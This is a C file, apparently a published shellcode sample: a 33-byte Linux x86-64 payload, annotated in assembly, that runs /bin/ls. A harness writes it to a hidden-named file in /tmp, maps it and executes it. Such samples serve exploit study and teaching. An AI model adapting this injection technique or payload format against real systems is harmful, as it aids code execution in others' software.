/*
 * [Linux/X86-64]
 * Shellcode for: execve("/bin/ls", ["/bin/ls"], NULL)
 * 33 bytes
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[] =
"\x48\x31\xd2"                  // xor %rdx,%rdx
"\x48\xbb\xff\x2f\x62\x69\x6e"  // mov $0x736c2f6e69622fff,%rbx
"\x2f\x6c\x73"
"\x48\xc1\xeb\x08"              // shr $0x8,%rbx
"\x53"                          // push %rbx
"\x48\x89\xe7"                  // mov %rsp,%rdi
"\x48\x31\xc0"                  // xor %rax,%rax
"\x50"                          // push %rax
"\x57"                          // push %rdi
"\x48\x89\xe6"                  // mov %rsp,%rsi
"\xb0\x3b"                      // mov $0x3b,%al
"\x0f\x05";                     // syscall

int
main(void)
{
    void (*p)();
    int fd;

    printf("Length: %d\n", strlen(shellcode));

    fd = open("/tmp/. ", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
    if (fd < 0)
        err(1, "open");

    write(fd, shellcode, strlen(shellcode));
    if ((lseek(fd, 0L, SEEK_SET)) < 0)
        err(1, "lseek");

    p = (void (*)())mmap(NULL, strlen(shellcode), PROT_READ, MAP_SHARED,
                                                                 fd, 0);
    if (p == (void (*)())MAP_FAILED)
        err(1, "mmap");
    p();
    return 0;
}

